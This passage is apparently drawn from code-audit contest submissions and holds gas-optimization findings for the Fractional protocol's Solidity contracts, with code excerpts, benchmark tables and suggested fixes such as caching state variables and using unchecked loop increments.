┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ redeem               ┆ 4184            ┆ 30536  ┆ 41198  ┆ 41198  ┆ 8       │ ╰──────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - new gas costs   ╭──────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Buyout contract      ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 2775995              ┆ 13865           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ redeem               ┆ 4184            ┆ 30532  ┆ 41193  ┆ 41193  ┆ 8       │ ╰──────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - `3,008` gas is saved upon deployment - `5` gas is saved per `redeem` call on average    # Transfers should be avoided if amount null  ## IMPACT  Gas can be saved by avoid `ERC20.transfer` function calls when the `amount` to be transferred is `0`  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Buyout.sol  ```cpp 129:         IERC1155(token).safeTransferFrom( 130:             msg.sender, 131:             address(this), 132:             id, 133:             _amount, 134:             "" 135:         ); ``` There is no check that `_amount` is not zero ( it is a function argument)  ```cpp 141:         _sendEthOrWeth(msg.sender, ethAmount); ``` In the case `_amount` was zero, `ethAmount` would be zero too  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add checks to ensure the `_amount` is not `0`  # Unchecked arithmetic  ## IMPACT  The default "checked" behavior costs more gas when adding/diving/multiplying, because under-the-hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected.  if it can statically be determined there is no possible way for your arithmetic to under/overflow (such as a condition in an if statement), surrounding the arithmetic in an `unchecked` block will save gas  ## PROOF OF CONCEPT  Instances:   ### src/Vault.sol  `i` is cannot overflow as it is a `for` loop  ```cpp 78:         for (uint256 i = 0; i < length; i++) ```  `i` is cannot overflow as it is a `for` loop  ```cpp 104:         for (uint256 i = 0; i < length; i++) ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Place the arithmetic operations in an `unchecked` block   # Unnecessary computation  ## IMPACT  Redundant external calls waste gas.  ## PROOF OF CONCEPT  Instances:  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438 - `buyoutInfo` is called twice:  ```cpp 438:         (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault) 447:         (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(_vault); ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace  ```diff -438:         (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo( -439:             _vault -440:         ); +438:         (, address proposer, State current, , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo( +439:             _vault +440:         ); 441:         State required = State.SUCCESS; 442:         if (current != required) revert IBuyout.InvalidState(required, current); 443:         // Reverts if proposer of buyout is not this contract 444:         if (proposer != address(this)) revert NotProposalBuyout(); 445:  446:         // Gets the last total supply of fractions for the vault -447:         (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo( -448:             _vault -449:         );  ```  - gas costs before amendment  ╭──────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Migration contract       ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost          ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3202385                  ┆ 15886           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name            ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ migrateFractions         ┆ 4079            ┆ 15056  ┆ 5786   ┆ 39226  ┆ 6       │ ╰──────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - gas costs after amendment  ╭──────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Migration contract       ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost          ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3166145                  ┆ 15705           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name            ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ migrateFractions         ┆ 4094            ┆ 14384  ┆ 5786   ┆ 36970  ┆ 6       │ ╰──────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - `36,240` gas is saved upon deployment - `672` gas is saved per `migrateFractions` call on average 
## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | [G&#x2011;01] | Check the first bit of the number rather than using the modulo operator, to save gas | 1 | | [G&#x2011;02] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 2 | | [G&#x2011;03] | State variables only set in the constructor should be declared `immutable` | 70 | | [G&#x2011;04] | Structs can be packed into fewer storage slots | 1 | | [G&#x2011;05] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 15 | | [G&#x2011;06] | Using `storage` instead of `memory` for structs/arrays saves gas | 2 | | [G&#x2011;07] | State variables should be cached in stack variables rather than re-reading them from storage | 27 | | [G&#x2011;08] | Multiple accesses of a mapping/array should use a local variable cache | 1 | | [G&#x2011;09] | `internal` functions only called once can be inlined to save gas | 3 | | [G&#x2011;10] | `<array>.length` should not be looked up in every loop of a `for`-loop | 8 | | [G&#x2011;11] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 2 | | [G&#x2011;12] | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 2 | | [G&#x2011;13] | Optimize names to save gas | 28 | | [G&#x2011;14] | Using `bool`s for storage incurs overhead | 1 | | [G&#x2011;15] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 3 | | [G&#x2011;16] | Using `private` rather than `public` for constants, saves gas | 5 | | [G&#x2011;17] | Division by two should use bit shifting | 3 | | [G&#x2011;18] | Empty blocks should be removed or emit something | 3 | | [G&#x2011;19] | Use custom errors rather than `revert()`/`require()` strings to save gas | 5 | | [G&#x2011;20] | Functions guaranteed to revert when called by normal users can be marked `payable` | 6 |  Total: 188 instances over 20 issues   ## Gas Optimizations  ### [G&#x2011;01]  Check the first bit of the number rather than using the modulo operator, to save gas Do the same sort of bit check as is on line 135  *There is 1 instance of this issue:* ```solidity File: src/utils/MerkleBase.sol  91:                  if (_node % 2 == 1) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L91  ### [G&#x2011;02]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There are 2 instances of this issue:* ```solidity File: src/FERC1155.sol  23        mapping(address => mapping(address => mapping(uint256 => bool))) 24            public isApproved; 25        /// @notice Mapping of metadata contracts for token ID types => metadata address 26        mapping(uint256 => address) public metadata; 27        /// @notice Mapping to track account nonces for metadata txs owner => nonces 28        mapping(address => uint256) public nonces; 29        /// @notice Mapping to track total supply for token ID types => totalSupply 30        mapping(uint256 => uint256) public totalSupply; 31        /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress 32        mapping(uint256 => address) private royaltyAddress; 33        /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent 34:       mapping(uint256 => uint256) private royaltyPercent;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L23-L34  ```solidity File: src/modules/Migration.sol  45        mapping(address => mapping(uint256 => Proposal)) public migrationInfo; 46        /// @notice Mapping of a proposal ID to a user's ether contribution 47        mapping(uint256 => mapping(address => uint256)) private userProposalEth; 48        /// @notice Mapping of a proposal ID to a user's fractions contribution 49        mapping(uint256 => mapping(address => uint256)) 50:           private userProposalFractions;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L45-L50  ### [G&#x2011;03]  State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**).  *There are 70 instances of this issue:* ```solidity File: src/modules/Buyout.sol  /// @audit registry 47:           registry = _registry;  /// @audit registry 61:           (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 71:           uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 114:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 151:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 186:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 210:                  IVaultRegistry(registry).totalSupply(_vault) >  /// @audit registry 246:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 267:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 280:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 288:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 319:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 351:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 387:              (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 424:              (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit supply 48:           supply = _supply;  /// @audit supply 219:              IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 264:          IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 294:          IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 476:              supply,  /// @audit supply 477:              ISupply(supply).burn.selector  /// @audit transfer 49:           transfer = _transfer;  /// @audit transfer 334:          IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof);  /// @audit transfer 366:          IVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);  /// @audit transfer 403:          IVault(payable(_vault)).execute(transfer, data, _erc1155TransferProof);  /// @audit transfer 441:              transfer,  /// @audit transfer 482:              transfer,  /// @audit transfer 483:              ITransfer(transfer).ERC20Transfer.selector  /// @audit transfer 488:              transfer,  /// @audit transfer 489:              ITransfer(transfer).ERC721TransferFrom.selector  /// @audit transfer 494:              transfer,  /// @audit transfer 495:              ITransfer(transfer).ERC1155TransferFrom.selector  /// @audit transfer 500:              transfer,  /// @audit transfer 501:              ITransfer(transfer).ERC1155BatchTransferFrom.selector  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L47  ```solidity File: src/modules/Migration.sol  /// @audit buyout 58:           buyout = payable(_buyout);  /// @audit buyout 84:           (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 116:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 148:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 189:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 208:              IFERC1155(token).setApprovalFor(address(buyout), id, true);  /// @audit buyout 210:              IBuyout(buyout).start{value: proposal.totalEth}(_vault);  /// @audit buyout 225:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 263:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 301:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 343:          IBuyout(buyout).withdrawERC20(  /// @audit buyout 367:          IBuyout(buyout).withdrawERC721(  /// @audit buyout 393:          IBuyout(buyout).withdrawERC1155(  /// @audit buyout 420:          IBuyout(buyout).batchWithdrawERC1155(  /// @audit buyout 438:          (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(  /// @audit buyout 447:          (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(  /// @audit registry 59:           registry = _registry;  /// @audit registry 81:           (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 95:           proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(  /// @audit registry 111:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 143:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 184:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 200:              IVaultRegistry(registry).totalSupply(_vault),  /// @audit registry 235:          address newVault = IVaultRegistry(registry).create(  /// @audit registry 296:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 435:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 467:          (address token, uint256 newFractionId) = IVaultRegistry(registry)  /// @audit registry 470:          uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L58  ```solidity File: src/modules/Minter.sol  /// @audit supply 18:           supply = _supply;  /// @audit supply 40:               supply,  /// @audit supply 60:           IVault(payable(_vault)).execute(supply, data, _mintProof);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L18  ```solidity File: src/modules/protoforms/BaseVault.sol  /// @audit registry 25:           registry = _registry;  /// @audit registry 43:           vault = IVaultRegistry(registry).create(  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L25  ```solidity File: src/VaultFactory.sol  /// @audit implementation 21:           implementation = address(new Vault());  /// @audit implementation 39:           (uint256 creationPtr, uint256 creationSize) = implementation  /// @audit implementation 69:           vault = implementation.clone(salt, data);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L21  ### [G&#x2011;04]  Structs can be packed into fewer storage slots Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings  *There is 1 instance of this issue:* ```solidity File: src/interfaces/IMigration.sol  /// @audit Variable ordering with 10 slots instead of the current 11: ///           uint256(32):startTime, uint256(32):targetPrice, uint256(32):totalEth, uint256(32):totalFractions, address[](32):modules, address[](32):plugins, bytes4[](32):selectors, uint256(32):oldFractionSupply, uint256(32):newFractionSupply, address(20):newVault, bool(1):isCommited, bool(1):fractionsMigrated 8     struct Proposal { 9         // Start time of the migration proposal 10        uint256 startTime; 11        // Target buyout price for the migration 12        uint256 targetPrice; 13        // Total ether contributed to the migration 14        uint256 totalEth; 15        // Total fractions contributed to the migration 16        uint256 totalFractions; 17        // Module contract addresses proposed for the migration 18        address[] modules; 19        // Plugin contract addresses proposed for the migration 20        address[] plugins; 21        // Function selectors for the proposed plugins 22        bytes4[] selectors; 23        // Address for the new vault to migrate to (if buyout is succesful) 24        address newVault; 25        // Boolean status to check if the propoal is active 26        bool isCommited; 27        // Old fraction supply for a given vault 28        uint256 oldFractionSupply; 29        // New fraction supply for a given vault that has succesfully migrated 30        uint256 newFractionSupply; 31        // Boolean status to check that the fractions have already been migrated 32        bool fractionsMigrated; 33:   }  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IMigration.sol#L8-L33  ### [G&#x2011;05]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead.   If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one  Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved  *There are 15 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit _uri 68:       function emitSetURI(uint256 _id, string memory _uri) external {  /// @audit _data 79        function mint( 80            address _to, 81            uint256 _id, 82            uint256 _amount, 83            bytes memory _data 84:       ) external onlyRegistry {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68  ```solidity File: src/utils/MerkleBase.sol  /// @audit _proof 43        function verifyProof( 44            bytes32 _root, 45            bytes32[] memory _proof, 46            bytes32 _valueToProve 47:       ) public pure returns (bool) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L43-L47  ```solidity File: src/utils/Metadata.sol  /// @audit _uri 24:       function setURI(uint256 _id, string memory _uri) external {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24  ```solidity File: src/VaultRegistry.sol  /// @audit _plugins /// @audit _selectors 51        function create( 52            bytes32 _merkleRoot, 53            address[] memory _plugins, 54            bytes4[] memory _selectors 55:       ) external returns (address vault) {  /// @audit _plugins /// @audit _selectors 67        function createFor( 68            bytes32 _merkleRoot, 69            address _owner, 70            address[] memory _plugins, 71            bytes4[] memory _selectors 72:       ) external returns (address vault) {  /// @audit _plugins /// @audit _selectors 83        function createCollection( 84            bytes32 _merkleRoot, 85            address[] memory _plugins, 86            bytes4[] memory _selectors 87:       ) external returns (address vault, address token) {  /// @audit _plugins /// @audit _selectors 102       function createInCollection( 103           bytes32 _merkleRoot, 104           address _token, 105           address[] memory _plugins, 106           bytes4[] memory _selectors 107:      ) external returns (address vault) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L51-L55  ```solidity File: src/Vault.sol  /// @audit _selectors /// @audit _plugins 73:       function install(bytes4[] memory _selectors, address[] memory _plugins)  /// @audit _selectors 101:      function uninstall(bytes4[] memory _selectors) external {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L73  ### [G&#x2011;06]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 2 instances of this issue:* ```solidity File: src/VaultRegistry.sol  40:           VaultInfo memory info = vaultToToken[msg.sender];  118:          VaultInfo memory info = vaultToToken[msg.sender];  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L40  ### [G&#x2011;07]  State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 27 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit _controller on line 303 305:              : controllerAddress = _controller;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L305  ```solidity File: src/modules/Buyout.sol  /// @audit registry on line 61 71:           uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry on line 186 210:                  IVaultRegistry(registry).totalSupply(_vault) >  /// @audit registry on line 246 267:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry on line 280 288:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit supply on line 476 477:              ISupply(supply).burn.selector  /// @audit transfer on line 482 483:              ITransfer(transfer).ERC20Transfer.selector  /// @audit transfer on line 483 488:              transfer,  /// @audit transfer on line 488 489:              ITransfer(transfer).ERC721TransferFrom.selector  /// @audit transfer on line 489 494:              transfer,  /// @audit transfer on line 494 495:              ITransfer(transfer).ERC1155TransferFrom.selector  /// @audit transfer on line 495 500:              transfer,  /// @audit transfer on line 500 501:              ITransfer(transfer).ERC1155BatchTransferFrom.selector  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L71  ```solidity File: src/modules/Migration.sol  /// @audit buyout on line 189 208:              IFERC1155(token).setApprovalFor(address(buyout), id, true);  /// @audit buyout on line 208 210:              IBuyout(buyout).start{value: proposal.totalEth}(_vault);  /// @audit buyout on line 438 447:          (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(  /// @audit registry on line 81 95:           proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(  /// @audit registry on line 184 200:              IVaultRegistry(registry).totalSupply(_vault),  /// @audit registry on line 435 467:          (address token, uint256 newFractionId) = IVaultRegistry(registry)  /// @audit registry on line 467 470:          uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L208  ```solidity File: src/Vault.sol  /// @audit owner on line 76 76:           if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 87 87:           if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 94 94:           if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 102 102:          if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 126 /// @audit owner on line 132 132:          if (owner_ != owner) revert OwnerChanged(owner_, owner);  /// @audit nonce on line 25 25:           if (nonce != 0) revert Initialized(owner, msg.sender, nonce);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L76  ### [G&#x2011;08]  Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata  *There is 1 instance of this issue:* ```solidity File: src/modules/Buyout.sol  /// @audit buyoutInfo[_vault] on line 297 297:          (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = (  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L297  ### [G&#x2011;09]  `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There are 3 instances of this issue:* ```solidity File: src/FERC1155.sol  324       function _computePermitStructHash( 325           address _owner, 326           address _operator, 327           uint256 _id, 328           bool _approved, 329           uint256 _deadline 330:      ) internal returns (bytes32) {  350       function _computePermitAllStructHash( 351           address _owner, 352           address _operator, 353           bool _approved, 354           uint256 _deadline 355:      ) internal returns (bytes32) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324-L330  ```solidity File: src/Vault.sol  142:      function _revertedWithReason(bytes memory _response) internal pure {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L142  ### [G&#x2011;10]  `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 8 instances of this issue:* ```solidity File: src/modules/Buyout.sol  454:          for (uint256 i; i < permissions.length; ) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454  ```solidity File: src/modules/protoforms/BaseVault.sol  64:           for (uint256 i = 0; i < _tokens.length; ) {  83:           for (uint256 i = 0; i < _tokens.length; ) {  107:              for (uint256 i = 0; i < _tokens.length; ++i) {  130:              for (uint256 i; i < _modules.length; ++i) {  132:                  for (uint256 j; j < leaves.length; ++j) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L64  ```solidity File: src/utils/MerkleBase.sol  51:               for (uint256 i = 0; i < _proof.length; ++i) {  